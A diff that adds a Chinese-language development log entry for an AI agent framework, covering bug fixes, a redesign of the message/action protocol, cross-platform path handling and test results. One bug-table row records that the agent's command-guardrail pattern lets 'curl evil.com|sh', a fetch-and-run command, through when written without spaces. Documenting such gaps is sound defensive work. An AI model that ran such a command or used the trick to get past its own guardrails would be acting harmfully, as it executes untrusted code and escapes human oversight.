@@ -586,3 +586,110 @@ core/
 
 - **186 测试全部通过**（+4 新增 streaming 测试）
 - Mock 流式逐字符验证 + LLM_TOKEN 事件订阅验证
+
+## 阶段十六：Bug 修复 + Communication Channel 升级（2026-07-27）
+
+### 问题发现：验证驱动的缺陷暴露
+
+对 agent 核心功能进行端到端验证（21 个场景、49 项检查），发现 4 个缺陷：
+
+| # | 缺陷 | 类型 | 修复 |
+|---|------|------|------|
+| 1 | `max_iterations` 差一错误：`>` 应为 `>=`，导致 agent 总是多跑一轮 | 逻辑错误 | 立即修复 → `ddd703e` |
+| 2 | `APPROVAL_REQUIRED` 事件重复发射：`_on_guardrail` 和 `_on_wait_approval` 各 emit 一次 | 重复事件 | 立即修复 → `ddd703e` |
+| 3 | `CommandPolicy` 模式覆盖不足：`curl evil.com\|sh` 无空格绕过 `\| sh` 模式 | 安全策略漏洞 | 进入后续加强 |
+| 4 | Windows 路径反斜杠破坏 JSON 解析：`C:\Users\...` 中的 `\U` 是非法的 JSON 转义序列 | 跨平台兼容 | 设计 4 层协作方案 |
+
+### 架构讨论：Communication Channel 重构
+
+用户对问题 4 提出了深层次的设计批评：**本质不是 JSON 解析问题，而是 LLM 被要求同时处理业务意图和操作系统细节**。正确的设计是 LLM 生成抽象路径，Runtime 做平台转换。
+
+同时用户指出现有架构的核心问题：**通信能力被错误地嵌入状态机中**。
+- `respond` 是一个 FSM 状态节点，不能和 tool 在同一轮 LLM 响应中共存
+- Session 保存的是任务结果摘要，不是完整的消息流
+- Agent 执行流和交流流被错误绑定
+
+### 设计方案（用户主导，Agent 执行）
+
+#### 跨平台路径：4 层协作模型
+
+```
+Layer 1: Prompt 约束 → 引导 LLM 使用 forward slash
+Layer 2: Schema 限制 → ActionValidator 拒绝反斜杠
+Layer 3: Runtime 转换 → PathNormalizer (pathlib) 透明处理
+Layer 4: JSON repair fallback → 兜底修复
+```
+
+#### Communication Channel：消息从状态机抽离
+
+| 概念 | 旧模型 | 新模型 |
+|------|--------|--------|
+| LLM 响应 | 只有一个 action | message + action 可共存 |
+| 用户消息 | FSM RESPOND 状态 | LLM_MESSAGE EventBus 事件 |
+| 用户提问 | respond action | ask action → WAIT_INPUT 状态 |
+| 任务完成 | finish.summary | message 字段统一出口 |
+
+#### 最终 Action 协议
+
+```json
+{
+  "message": "我先查看项目结构",       // 可选：发给用户的文本
+  "action": {                          // 可选：工具调用或控制动作
+    "name": "read_file",
+    "parameters": {"path": "README.md"}
+  }
+}
+```
+
+- message 和 action 均可选，至少一个存在
+- message-only：纯通信，不执行工具
+- action-only：静默执行（日常工具调用）
+- message+action：边说边做
+
+#### Session 模型
+
+```
+Session = Message Store（完整消息流）
+  ├── user messages
+  ├── assistant messages (type="message" | "action")
+  └── tool results
+
+删除 MemoryManager.session
+删除 "Task completed" 有损摘要
+```
+
+### 决策记录
+
+| 决策点 | 选项 | 最终选择 | 理由 |
+|--------|------|---------|------|
+| message 是否必填 | 必填 / 可选 | **可选** | 大量工具调用无需消息，token 节省 |
+| message 格式 | 纯 string / {type, content} | **纯 string（MVP）** | 未来可扩展 typed message，当前简化 |
+| finish 的 summary | 保留 / 移除 | **移除** | message 统一出口 |
+| ask 与 message 的关系 | 合并 / 分离 | **分离** | ask 需要 FSM 状态（WAIT_INPUT），message 只需 EventBus |
+| RESPOND 状态 | 删除 / 保留 | **保留（向后兼容）** | 旧 respond action 仍通过 RESPOND 状态工作，但不推广 |
+| Session Memory | 三层 / 两层 | **仅 ConversationMemory** | MemoryManager.session 移除，Session 直接持有 |
+| 执行方式 | Inline / Subagent-Driven | **Subagent-Driven（10 Tasks）** | 顺序依赖，每 task 两阶段 review |
+
+### 实现概览（4 阶段、10 Task）
+
+| Phase | Tasks | 关键变更 | 测试 |
+|-------|-------|---------|------|
+| 1: Session Unification | 1.1-1.3 | ConversationMemory type 字段、AgentRuntime delta sync、移除 MemoryManager.session | 205 |
+| 2: Response Protocol | 2.1-2.3 | ParseResult.message、LLM_MESSAGE event、FormatSection 升级 | 214 |
+| 3: ask/WAIT_INPUT | 3.1-3.2 | WAIT_INPUT 状态 + _on_wait_input、CONTROL_SCHEMAS respond→ask | 217 |
+| 4: Renderer | 4.1-4.2 | _on_llm_message 处理器、SessionManager 事件订阅 | 220 |
+
+### 验证结果
+
+- **220 测试全部通过**（从 201 起 +19 新增）
+- **Guardrail deny 测试**：危险命令正确拦截，deny→CONTEXT_ORG→LLM 重试
+- **HITL 审批测试**：git push → APPROVAL_REQUIRED → approve→执行 / reject→回退
+- **JSON repair 测试**：未转义引号正确修复
+- **Legacy 格式测试**：向后兼容
+- **Message-only 测试**：纯消息正常流转回 CONTEXT_ORG
+- **ask 测试**：正确进入 WAIT_INPUT 并等待队列响应
+
+### 产出文件
+
+- `docs/superpowers/plans/2026-07-27-communication-channel-plan.md` — 实现计划（10 Task）
+- 10 个 commit：`ddd703e` → `3395248`
